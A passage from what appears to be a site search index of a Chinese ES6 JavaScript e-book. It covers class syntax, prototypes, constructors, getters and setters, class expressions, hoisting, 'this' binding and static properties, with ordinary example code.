\u7684\u201c\u7c7b\u201d\u4e0a\u9762\u7ee7\u7eed\u5b58\u5728\u3002\u7c7b\u7684\u6240\u6709\u65b9\u6cd5\u90fd\u5b9a\u4e49\u5728\u7c7b\u7684<code>prototype</code>\u5c5e\u6027\u4e0a\u9762\u3002</p> <pre><code>class Point {\n  constructor() {\n    // ...\n  }\n  toString() {\n    // ...\n  }\n  toValue() {\n    // ...\n  }\n}\n\n// \u7b49\u540c\u4e8e\nPoint.prototype = {\n  constructor() {},\n  toString() {},\n  toValue() {},\n};\n</code></pre> <p>\u5728\u7c7b\u7684\u5b9e\u4f8b\u4e0a\u9762\u8c03\u7528\u65b9\u6cd5\uff0c\u5176\u5b9e\u5c31\u662f\u8c03\u7528\u539f\u578b\u4e0a\u7684\u65b9\u6cd5\u3002</p> <p>\u7531\u4e8e\u7c7b\u7684\u65b9\u6cd5\u90fd\u5b9a\u4e49\u5728<code>prototype</code>\u5bf9\u8c61\u4e0a\u9762\uff0c\u6240\u4ee5\u7c7b\u7684\u65b0\u65b9\u6cd5\u53ef\u4ee5\u6dfb\u52a0\u5728<code>prototype</code>\u5bf9\u8c61\u4e0a\u9762\u3002</p> <p><code>Object.assign</code>\u65b9\u6cd5\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u4e00\u6b21\u5411\u7c7b\u6dfb\u52a0\u591a\u4e2a\u65b9\u6cd5\u3002</p> <pre><code>class Point {\n  constructor(){\n    // ...\n  }\n}\n\nObject.assign(Point.prototype, {\n  toString(){},\n  toValue(){}\n});\n</code></pre> <p><code>prototype</code>\u5bf9\u8c61\u7684<code>constructor</code>\u5c5e\u6027\uff0c\u76f4\u63a5\u6307\u5411\u201c\u7c7b\u201d\u7684\u672c\u8eab\uff0c\u8fd9\u4e0e ES5 \u7684\u884c\u4e3a\u662f\u4e00\u81f4\u7684\u3002</p> <pre><code>Point.prototype.constructor === Point // true\n</code></pre> <p>\u53e6\u5916\uff0c\u7c7b\u7684\u5185\u90e8\u6240\u6709\u5b9a\u4e49\u7684\u65b9\u6cd5\uff0c\u90fd\u662f\u4e0d\u53ef\u679a\u4e3e\u7684\uff08non-enumerable\uff09\u3002ES5 \u7684\u6784\u9020\u51fd\u6570\u5b9a\u4e49\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u53ef\u679a\u4e3e\u7684\u3002</p> <pre><code>class Point {\n  constructor(x, y) {\n    // ...\n  }\n  toString() {\n    // ...\n  }\n}\n\nObject.keys(Point.prototype)\n// []\nObject.getOwnPropertyNames(Point.prototype)\n// [\"constructor\",\"toString\"]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>toString</code>\u65b9\u6cd5\u662f<code>Point</code>\u7c7b\u5185\u90e8\u5b9a\u4e49\u7684\u65b9\u6cd5\uff0c\u5b83\u662f\u4e0d\u53ef\u679a\u4e3e\u7684\u3002\u8fd9\u4e00\u70b9\u4e0e ES5 \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u3002</p> <pre><code>var Point = function (x, y) {\n  // ...\n};\nPoint.prototype.toString = function() {\n  // ...\n};\n\nObject.keys(Point.prototype)\n// [\"toString\"]\nObject.getOwnPropertyNames(Point.prototype)\n// [\"constructor\",\"toString\"]\n</code></pre>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#constructor","title":"constructor \u65b9\u6cd5","text":"<p><code>constructor</code>\u65b9\u6cd5\u662f\u7c7b\u7684\u9ed8\u8ba4\u65b9\u6cd5\uff0c\u901a\u8fc7<code>new</code>\u547d\u4ee4\u751f\u6210\u5bf9\u8c61\u5b9e\u4f8b\u65f6\uff0c\u81ea\u52a8\u8c03\u7528\u8be5\u65b9\u6cd5\u3002\u4e00\u4e2a\u7c7b\u5fc5\u987b\u6709<code>constructor</code>\u65b9\u6cd5\uff0c\u5982\u679c\u6ca1\u6709\u663e\u5f0f\u5b9a\u4e49\uff0c\u4e00\u4e2a\u7a7a\u7684<code>constructor</code>\u65b9\u6cd5\u4f1a\u88ab\u9ed8\u8ba4\u6dfb\u52a0\u3002</p> <pre><code>class Point {\n}\n\n// \u7b49\u540c\u4e8e\nclass Point {\n  constructor() {}\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7a7a\u7684\u7c7b<code>Point</code>\uff0c\u4f1a\u81ea\u52a8\u4e3a\u5b83\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u7684<code>constructor</code>\u65b9\u6cd5\u3002</p> <p><code>constructor</code>\u65b9\u6cd5\u9ed8\u8ba4\u8fd4\u56de\u5b9e\u4f8b\u5bf9\u8c61\uff08\u5373<code>this</code>\uff09\uff0c\u5b8c\u5168\u53ef\u4ee5\u6307\u5b9a\u8fd4\u56de\u53e6\u5916\u4e00\u4e2a\u5bf9\u8c61\u3002</p> <pre><code>class Foo {\n  constructor() {\n    return Object.create(null);\n  }\n}\n\nnew Foo() instanceof Foo\n// false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>constructor</code>\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5168\u65b0\u7684\u5bf9\u8c61\uff0c\u7ed3\u679c\u5bfc\u81f4\u5b9e\u4f8b\u5bf9\u8c61\u4e0d\u662f<code>Foo</code>\u7c7b\u7684\u5b9e\u4f8b\u3002</p> <p>\u7c7b\u5fc5\u987b\u4f7f\u7528<code>new</code>\u8c03\u7528\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u8fd9\u662f\u5b83\u8ddf\u666e\u901a\u6784\u9020\u51fd\u6570\u7684\u4e00\u4e2a\u4e3b\u8981\u533a\u522b\uff0c\u540e\u8005\u4e0d\u7528<code>new</code>\u4e5f\u53ef\u4ee5\u6267\u884c\u3002</p> <pre><code>class Foo {\n  constructor() {\n    return Object.create(null);\n  }\n}\nFoo()\n// TypeError: Class constructor Foo cannot be invoked without 'new'\n</code></pre>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_3","title":"\u7c7b\u7684\u5b9e\u4f8b","text":"<p>\u751f\u6210\u7c7b\u7684\u5b9e\u4f8b\u7684\u5199\u6cd5\uff0c\u4e0e ES5 \u5b8c\u5168\u4e00\u6837\uff0c\u4e5f\u662f\u4f7f\u7528<code>new</code>\u547d\u4ee4\u3002</p> <pre><code>class Point {\n  // ...\n}\nvar point = new Point(2, 3);\n</code></pre> <p>\u4e0e ES5 \u4e00\u6837\uff0c\u5b9e\u4f8b\u7684\u5c5e\u6027\u9664\u975e\u663e\u5f0f\u5b9a\u4e49\u5728\u5176\u672c\u8eab\uff08\u5373\u5b9a\u4e49\u5728\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\uff0c\u5373<code>this</code>\uff09\uff0c\u5426\u5219\u90fd\u662f\u5b9a\u4e49\u5728\u539f\u578b\u5bf9\u8c61\u4e0a\uff08\u5373\u5b9a\u4e49\u5728<code>class</code>\u4e0a\uff09\u3002</p> <pre><code>//\u5b9a\u4e49\u7c7b\nclass Point {\n  constructor(x, y) {\n    this.x = x;\n    this.y = y;\n  }\n  toString() {\n    return '(' + this.x + ', ' + this.y + ')';\n  }\n}\n\nvar point = new Point(2, 3);\n\npoint.toString() // (2, 3)\npoint.hasOwnProperty('x') // true\npoint.hasOwnProperty('y') // true\npoint.hasOwnProperty('toString') // false\npoint.__proto__.hasOwnProperty('toString') // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>x</code>\u548c<code>y</code>\u90fd\u662f\u5b9e\u4f8b\u5bf9\u8c61<code>point</code>\u81ea\u8eab\u7684\u5c5e\u6027\uff08\u56e0\u4e3a\u5b9a\u4e49\u5728<code>this</code>\u53d8\u91cf\u4e0a\uff09\uff0c\u6240\u4ee5<code>hasOwnProperty</code>\u65b9\u6cd5\u8fd4\u56de<code>true</code>\uff0c\u800c<code>toString</code>\u662f\u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\uff08\u56e0\u4e3a\u5b9a\u4e49\u5728<code>Point</code>\u7c7b\u4e0a\uff09\uff0c\u6240\u4ee5<code>hasOwnProperty</code>\u65b9\u6cd5\u8fd4\u56de<code>false</code>\u3002\u8fd9\u4e9b\u90fd\u4e0e ES5 \u7684\u884c\u4e3a\u4fdd\u6301\u4e00\u81f4\u3002</p> <p>\u4e0e ES5 \u4e00\u6837\uff0c\u7c7b\u7684\u6240\u6709\u5b9e\u4f8b\u5171\u4eab\u4e00\u4e2a\u539f\u578b\u5bf9\u8c61\u3002</p> <pre><code>var p1 = new Point(2,3);\nvar p2 = new Point(3,2);\n\np1.__proto__ === p2.__proto__\n//true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>p1</code>\u548c<code>p2</code>\u90fd\u662f<code>Point</code>\u7684\u5b9e\u4f8b\uff0c\u5b83\u4eec\u7684\u539f\u578b\u90fd\u662f<code>Point.prototype</code>\uff0c\u6240\u4ee5<code>__proto__</code>\u5c5e\u6027\u662f\u76f8\u7b49\u7684\u3002</p> <p>\u8fd9\u4e5f\u610f\u5473\u7740\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b9e\u4f8b\u7684<code>__proto__</code>\u5c5e\u6027\u4e3a\u201c\u7c7b\u201d\u6dfb\u52a0\u65b9\u6cd5\u3002</p> <p><code>__proto__</code> \u5e76\u4e0d\u662f\u8bed\u8a00\u672c\u8eab\u7684\u7279\u6027\uff0c\u8fd9\u662f\u5404\u5927\u5382\u5546\u5177\u4f53\u5b9e\u73b0\u65f6\u6dfb\u52a0\u7684\u79c1\u6709\u5c5e\u6027\uff0c\u867d\u7136\u76ee\u524d\u5f88\u591a\u73b0\u4ee3\u6d4f\u89c8\u5668\u7684 JS \u5f15\u64ce\u4e2d\u90fd\u63d0\u4f9b\u4e86\u8fd9\u4e2a\u79c1\u6709\u5c5e\u6027\uff0c\u4f46\u4f9d\u65e7\u4e0d\u5efa\u8bae\u5728\u751f\u4ea7\u4e2d\u4f7f\u7528\u8be5\u5c5e\u6027\uff0c\u907f\u514d\u5bf9\u73af\u5883\u4ea7\u751f\u4f9d\u8d56\u3002\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u4f7f\u7528 <code>Object.getPrototypeOf</code> \u65b9\u6cd5\u6765\u83b7\u53d6\u5b9e\u4f8b\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u7136\u540e\u518d\u6765\u4e3a\u539f\u578b\u6dfb\u52a0\u65b9\u6cd5/\u5c5e\u6027\u3002</p> <pre><code>var p1 = new Point(2,3);\nvar p2 = new Point(3,2);\n\np1.__proto__.printName = function () { return 'Oops' };\n\np1.printName() // \"Oops\"\np2.printName() // \"Oops\"\n\nvar p3 = new Point(4,2);\np3.printName() // \"Oops\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5728<code>p1</code>\u7684\u539f\u578b\u4e0a\u6dfb\u52a0\u4e86\u4e00\u4e2a<code>printName</code>\u65b9\u6cd5\uff0c\u7531\u4e8e<code>p1</code>\u7684\u539f\u578b\u5c31\u662f<code>p2</code>\u7684\u539f\u578b\uff0c\u56e0\u6b64<code>p2</code>\u4e5f\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002\u800c\u4e14\uff0c\u6b64\u540e\u65b0\u5efa\u7684\u5b9e\u4f8b<code>p3</code>\u4e5f\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4f7f\u7528\u5b9e\u4f8b\u7684<code>__proto__</code>\u5c5e\u6027\u6539\u5199\u539f\u578b\uff0c\u5fc5\u987b\u76f8\u5f53\u8c28\u614e\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528\uff0c\u56e0\u4e3a\u8fd9\u4f1a\u6539\u53d8\u201c\u7c7b\u201d\u7684\u539f\u59cb\u5b9a\u4e49\uff0c\u5f71\u54cd\u5230\u6240\u6709\u5b9e\u4f8b\u3002</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#gettersetter","title":"\u53d6\u503c\u51fd\u6570\uff08getter\uff09\u548c\u5b58\u503c\u51fd\u6570\uff08setter\uff09","text":"<p>\u4e0e ES5 \u4e00\u6837\uff0c\u5728\u201c\u7c7b\u201d\u7684\u5185\u90e8\u53ef\u4ee5\u4f7f\u7528<code>get</code>\u548c<code>set</code>\u5173\u952e\u5b57\uff0c\u5bf9\u67d0\u4e2a\u5c5e\u6027\u8bbe\u7f6e\u5b58\u503c\u51fd\u6570\u548c\u53d6\u503c\u51fd\u6570\uff0c\u62e6\u622a\u8be5\u5c5e\u6027\u7684\u5b58\u53d6\u884c\u4e3a\u3002</p> <pre><code>class MyClass {\n  constructor() {\n    // ...\n  }\n  get prop() {\n    return 'getter';\n  }\n  set prop(value) {\n    console.log('setter: '+value);\n  }\n}\n\nlet inst = new MyClass();\n\ninst.prop = 123;\n// setter: 123 \u8bbe\u7f6eprop\u7684\u503c\uff0c\u8fd9\u91cc\u5df2\u7ecf\u88ab\u7b2c\u4e00\u4e2a\u51fd\u6570\u62e6\u622a\n\ninst.prop\n// 'getter' \u83b7\u53d6prop\u7684\u503c\uff0c\u8fd9\u91cc\u5df2\u7ecf\u88ab\u62e6\u622a\u5230\u7b2c\u4e8c\u4e2a\u51fd\u6570\n\n// this is another example\nclass Name {\n  constructor(props) {\n    this.name = props.name;\n  }\n  get age() {\n    console.log('block get age function')\n  }\n  set age(value) {\n    console.log('set age ' + value);\n  }\n  sayHi() {\n    console.log(this.name);\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>prop</code>\u5c5e\u6027\u6709\u5bf9\u5e94\u7684\u5b58\u503c\u51fd\u6570\u548c\u53d6\u503c\u51fd\u6570\uff0c\u56e0\u6b64\u8d4b\u503c\u548c\u8bfb\u53d6\u884c\u4e3a\u90fd\u88ab\u81ea\u5b9a\u4e49\u4e86\u3002\u5b58\u503c\u51fd\u6570\u548c\u53d6\u503c\u51fd\u6570\u662f\u8bbe\u7f6e\u5728\u5c5e\u6027\u7684 Descriptor \u5bf9\u8c61\u4e0a\u7684\u3002</p> <pre><code>class CustomHTMLElement {\n\n  constructor(element) {\n    this.element = element;\n  }\n\n  get html() {\n    return this.element.innerHTML;\n  }\n\n  set html(value) {\n    this.element.innerHTML = value;\n  }\n}\n\nvar descriptor = Object.getOwnPropertyDescriptor(\n  CustomHTMLElement.prototype, \"html\"\n);\n\n\"get\" in descriptor  // true\n\"set\" in descriptor  // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b58\u503c\u51fd\u6570\u548c\u53d6\u503c\u51fd\u6570\u662f\u5b9a\u4e49\u5728<code>html</code>\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u4e0a\u9762\uff0c\u8fd9\u4e0e ES5 \u5b8c\u5168\u4e00\u81f4\u3002</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_4","title":"\u5c5e\u6027\u8868\u8fbe\u5f0f","text":"<p>\u7c7b\u7684\u5c5e\u6027\u540d\uff0c\u53ef\u4ee5\u91c7\u7528\u8868\u8fbe\u5f0f\u3002</p> <pre><code>let methodName = 'getArea';\n\nclass Square {\n  constructor(length) {\n    // ...\n  }\n\n  [methodName]() {\n    // ...\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Square</code>\u7c7b\u7684\u65b9\u6cd5\u540d<code>getArea</code>\uff0c\u662f\u4ece\u8868\u8fbe\u5f0f\u5f97\u5230\u7684\u3002</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#class_1","title":"Class \u8868\u8fbe\u5f0f","text":"<p>\u4e0e\u51fd\u6570\u4e00\u6837\uff0c\u7c7b\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8868\u8fbe\u5f0f\u7684\u5f62\u5f0f\u5b9a\u4e49\u3002</p> <pre><code>const MyClass = class Me {\n  getClassName() {\n    return Me.name;\n  }\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f7f\u7528\u8868\u8fbe\u5f0f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7c7b\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7c7b\u7684\u540d\u5b57\u662f<code>Me</code>\uff0c\u4f46\u662f<code>Me</code>\u53ea\u5728 Class \u7684\u5185\u90e8\u53ef\u7528\uff0c\u6307\u4ee3\u5f53\u524d\u7c7b\u3002\u5728 Class \u5916\u90e8\uff0c\u8fd9\u4e2a\u7c7b\u53ea\u80fd\u7528<code>MyClass</code>\u5f15\u7528\u3002</p> <pre><code>let inst = new MyClass();\ninst.getClassName() // Me\nMe.name // ReferenceError: Me is not defined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c<code>Me</code>\u53ea\u5728 Class \u5185\u90e8\u6709\u5b9a\u4e49\u3002</p> <p>\u5982\u679c\u7c7b\u7684\u5185\u90e8\u6ca1\u7528\u5230\u7684\u8bdd\uff0c\u53ef\u4ee5\u7701\u7565<code>Me</code>\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u7684\u5f62\u5f0f\u3002</p> <pre><code>const MyClass = class { /* ... */ };\n</code></pre> <p>\u91c7\u7528 Class \u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u5199\u51fa\u7acb\u5373\u6267\u884c\u7684 Class\u3002</p> <pre><code>let person = new class {\n  constructor(name) {\n    this.name = name;\n  }\n\n  sayName() {\n    console.log(this.name);\n  }\n}('\u5f20\u4e09');\n\nperson.sayName(); // \"\u5f20\u4e09\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>person</code>\u662f\u4e00\u4e2a\u7acb\u5373\u6267\u884c\u7684\u7c7b\u7684\u5b9e\u4f8b\u3002</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_5","title":"\u6ce8\u610f\u70b9","text":"<p>\uff081\uff09\u4e25\u683c\u6a21\u5f0f</p> <p>\u7c7b\u548c\u6a21\u5757\u7684\u5185\u90e8\uff0c\u9ed8\u8ba4\u5c31\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u4f7f\u7528<code>use strict</code>\u6307\u5b9a\u8fd0\u884c\u6a21\u5f0f\u3002\u53ea\u8981\u4f60\u7684\u4ee3\u7801\u5199\u5728\u7c7b\u6216\u6a21\u5757\u4e4b\u4e2d\uff0c\u5c31\u53ea\u6709\u4e25\u683c\u6a21\u5f0f\u53ef\u7528\u3002\u8003\u8651\u5230\u672a\u6765\u6240\u6709\u7684\u4ee3\u7801\uff0c\u5176\u5b9e\u90fd\u662f\u8fd0\u884c\u5728\u6a21\u5757\u4e4b\u4e2d\uff0c\u6240\u4ee5 ES6 \u5b9e\u9645\u4e0a\u628a\u6574\u4e2a\u8bed\u8a00\u5347\u7ea7\u5230\u4e86\u4e25\u683c\u6a21\u5f0f\u3002</p> <p>\uff082\uff09\u4e0d\u5b58\u5728\u63d0\u5347</p> <p>\u7c7b\u4e0d\u5b58\u5728\u53d8\u91cf\u63d0\u5347\uff08hoist\uff09\uff0c\u8fd9\u4e00\u70b9\u4e0e ES5 \u5b8c\u5168\u4e0d\u540c\u3002</p> <pre><code>new Foo(); // ReferenceError\nclass Foo {}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Foo</code>\u7c7b\u4f7f\u7528\u5728\u524d\uff0c\u5b9a\u4e49\u5728\u540e\uff0c\u8fd9\u6837\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a ES6 \u4e0d\u4f1a\u628a\u7c7b\u7684\u58f0\u660e\u63d0\u5347\u5230\u4ee3\u7801\u5934\u90e8\u3002\u8fd9\u79cd\u89c4\u5b9a\u7684\u539f\u56e0\u4e0e\u4e0b\u6587\u8981\u63d0\u5230\u7684\u7ee7\u627f\u6709\u5173\uff0c\u5fc5\u987b\u4fdd\u8bc1\u5b50\u7c7b\u5728\u7236\u7c7b\u4e4b\u540e\u5b9a\u4e49\u3002</p> <pre><code>{\n  let Foo = class {};\n  class Bar extends Foo {\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a<code>Bar</code>\u7ee7\u627f<code>Foo</code>\u7684\u65f6\u5019\uff0c<code>Foo</code>\u5df2\u7ecf\u6709\u5b9a\u4e49\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u5b58\u5728<code>class</code>\u7684\u63d0\u5347\uff0c\u4e0a\u9762\u4ee3\u7801\u5c31\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a<code>class</code>\u4f1a\u88ab\u63d0\u5347\u5230\u4ee3\u7801\u5934\u90e8\uff0c\u800c<code>let</code>\u547d\u4ee4\u662f\u4e0d\u63d0\u5347\u7684\uff0c\u6240\u4ee5\u5bfc\u81f4<code>Bar</code>\u7ee7\u627f<code>Foo</code>\u7684\u65f6\u5019\uff0c<code>Foo</code>\u8fd8\u6ca1\u6709\u5b9a\u4e49\u3002</p> <p>\uff083\uff09name \u5c5e\u6027</p> <p>\u7531\u4e8e\u672c\u8d28\u4e0a\uff0cES6 \u7684\u7c7b\u53ea\u662f ES5 \u7684\u6784\u9020\u51fd\u6570\u7684\u4e00\u5c42\u5305\u88c5\uff0c\u6240\u4ee5\u51fd\u6570\u7684\u8bb8\u591a\u7279\u6027\u90fd\u88ab<code>Class</code>\u7ee7\u627f\uff0c\u5305\u62ec<code>name</code>\u5c5e\u6027\u3002name \u5c5e\u6027\u603b\u662f\u8fd4\u56de\u7d27\u8ddf\u5728<code>class</code>\u5173\u952e\u5b57\u540e\u9762\u7684\u7c7b\u540d\u3002</p> <pre><code>class Point {}\nPoint.name // \"Point\"\n</code></pre> <p>\uff084\uff09Generator \u65b9\u6cd5</p> <p>\u5982\u679c\u67d0\u4e2a\u65b9\u6cd5\u4e4b\u524d\u52a0\u4e0a\u661f\u53f7\uff08<code>*</code>\uff09\uff0c\u5c31\u8868\u793a\u8be5\u65b9\u6cd5\u662f\u4e00\u4e2a Generator \u51fd\u6570\u3002</p> <pre><code>class Foo {\n  constructor(...args) {\n    this.args = args;\n  }\n  * [Symbol.iterator]() {\n    for (let arg of this.args) {\n      yield arg;\n    }\n  }\n}\n\nfor (let x of new Foo('hello', 'world')) {\n  console.log(x);\n}\n// hello\n// world\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Foo</code>\u7c7b\u7684<code>Symbol.iterator</code>\u65b9\u6cd5\u524d\u6709\u4e00\u4e2a\u661f\u53f7\uff0c\u8868\u793a\u8be5\u65b9\u6cd5\u662f\u4e00\u4e2a Generator \u51fd\u6570\u3002<code>Symbol.iterator</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a<code>Foo</code>\u7c7b\u7684\u9ed8\u8ba4\u904d\u5386\u5668\uff0c<code>for...of</code>\u5faa\u73af\u4f1a\u81ea\u52a8\u8c03\u7528\u8fd9\u4e2a\u904d\u5386\u5668\u3002</p> <p>\uff085\uff09this \u7684\u6307\u5411</p> <p>\u7c7b\u7684\u65b9\u6cd5\u5185\u90e8\u5982\u679c\u542b\u6709<code>this</code>\uff0c\u5b83\u9ed8\u8ba4\u6307\u5411\u7c7b\u7684\u5b9e\u4f8b\u3002\u4f46\u662f\uff0c\u5fc5\u987b\u975e\u5e38\u5c0f\u5fc3\uff0c\u4e00\u65e6\u5355\u72ec\u4f7f\u7528\u8be5\u65b9\u6cd5\uff0c\u5f88\u53ef\u80fd\u62a5\u9519\u3002</p> <pre><code>class Logger {\n  printName(name = 'there') {\n    this.print(`Hello ${name}`);\n  }\n\n  print(text) {\n    console.log(text);\n  }\n}\n\nconst logger = new Logger();\nconst { printName } = logger;\nprintName(); // TypeError: Cannot read property 'print' of undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>printName</code>\u65b9\u6cd5\u4e2d\u7684<code>this</code>\uff0c\u9ed8\u8ba4\u6307\u5411<code>Logger</code>\u7c7b\u7684\u5b9e\u4f8b\u3002\u4f46\u662f\uff0c\u5982\u679c\u5c06\u8fd9\u4e2a\u65b9\u6cd5\u63d0\u53d6\u51fa\u6765\u5355\u72ec\u4f7f\u7528\uff0c<code>this</code>\u4f1a\u6307\u5411\u8be5\u65b9\u6cd5\u8fd0\u884c\u65f6\u6240\u5728\u7684\u73af\u5883\uff08\u7531\u4e8e class \u5185\u90e8\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u6240\u4ee5 this \u5b9e\u9645\u6307\u5411\u7684\u662f<code>undefined</code>\uff09\uff0c\u4ece\u800c\u5bfc\u81f4\u627e\u4e0d\u5230<code>print</code>\u65b9\u6cd5\u800c\u62a5\u9519\u3002</p> <p>\u4e00\u4e2a\u6bd4\u8f83\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u5728\u6784\u9020\u65b9\u6cd5\u4e2d\u7ed1\u5b9a<code>this</code>\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u627e\u4e0d\u5230<code>print</code>\u65b9\u6cd5\u4e86\u3002</p> <pre><code>class Logger {\n  constructor() {\n    this.printName = this.printName.bind(this);\n  }\n\n  // ...\n}\n</code></pre> <p>\u53e6\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u7bad\u5934\u51fd\u6570\u3002</p> <pre><code>class Obj {\n  constructor() {\n    this.getThis = () =&gt; this;\n  }\n}\n\nconst myObj = new Obj();\nmyObj.getThis() === myObj // true\n</code></pre> <p>\u7bad\u5934\u51fd\u6570\u5185\u90e8\u7684<code>this</code>\u603b\u662f\u6307\u5411\u5b9a\u4e49\u65f6\u6240\u5728\u7684\u5bf9\u8c61\u3002\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7bad\u5934\u51fd\u6570\u4f4d\u4e8e\u6784\u9020\u51fd\u6570\u5185\u90e8\uff0c\u5b83\u7684\u5b9a\u4e49\u751f\u6548\u7684\u65f6\u5019\uff0c\u662f\u5728\u6784\u9020\u51fd\u6570\u6267\u884c\u7684\u65f6\u5019\u3002\u8fd9\u65f6\uff0c\u7bad\u5934\u51fd\u6570\u6240\u5728\u7684\u8fd0\u884c\u73af\u5883\uff0c\u80af\u5b9a\u662f\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6240\u4ee5<code>this</code>\u4f1a\u603b\u662f\u6307\u5411\u5b9e\u4f8b\u5bf9\u8c61\u3002</p> <p>\u8fd8\u6709\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528<code>Proxy</code>\uff0c\u83b7\u53d6\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u81ea\u52a8\u7ed1\u5b9a<code>this</code>\u3002\u8fd9\u79cd\u65b9\u6cd5\u5f88\u5c11\u4f7f\u7528</p> <pre><code>function selfish (target) {\n  const cache = new WeakMap();\n  const handler = {\n    get (target, key) {\n      const value = Reflect.get(target, key);\n      if (typeof value !== 'function') {\n        return value;\n      }\n      if (!cache.has(value)) {\n        cache.set(value, value.bind(target));\n      }\n      return cache.get(value);\n    }\n  };\n  const proxy = new Proxy(target, handler);\n  return proxy;\n}\n\nconst logger = selfish(new Logger());\n</code></pre>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_6","title":"\u9759\u6001\u5c5e\u6027","text":"<p>\u9759\u6001\u5c5e\u6027\u6307\u7684\u662f Class \u672c\u8eab\u7684\u5c5e\u6027\uff0c\u5373<code>Class.propName</code>\uff0c\u800c\u4e0d\u662f\u5b9a\u4e49\u5728\u5b9e\u4f8b\u5bf9\u8c61\uff08<code>this</code>\uff09\u4e0a\u7684\u5c5e\u6027\u3002</p> <pre><code>class Foo {\n}\n\nFoo.prop = 1;\nFoo.prop // 1\n</code></pre> <p>\u4e0a\u9762\u7684\u5199\u6cd5\u4e3a<code>Foo</code>\u7c7b\u5b9a\u4e49\u4e86\u4e00\u4e2a\u9759\u6001\u5c5e\u6027<code>prop</code>\u3002</p> <p>\u76ee\u524d\uff0c\u53ea\u6709\u8fd9\u79cd\u5199\u6cd5\u53ef\u884c\uff0c\u56e0\u4e3a ES6 \u660e\u786e\u89c4\u5b9a\uff0cClass \u5185\u90e8\u53ea\u6709\u9759\u6001\u65b9\u6cd5\uff0c\u6ca1\u6709\u9759\u6001\u5c5e\u6027\u3002\u73b0\u5728\u6709\u4e00\u4e2a\u63d0\u6848\u63d0\u4f9b\u4e86\u7c7b\u7684\u9759\u6001\u5c5e\u6027\uff0c\u5199\u6cd5\u662f\u5728\u5b9e\u4f8b\u5c5e\u6027\u6cd5\u7684\u524d\u9762\uff0c\u52a0\u4e0a<code>static</code>\u5173\u952e\u5b57\u3002</p> <pre><code>class MyClass {\n  static myStaticProp = 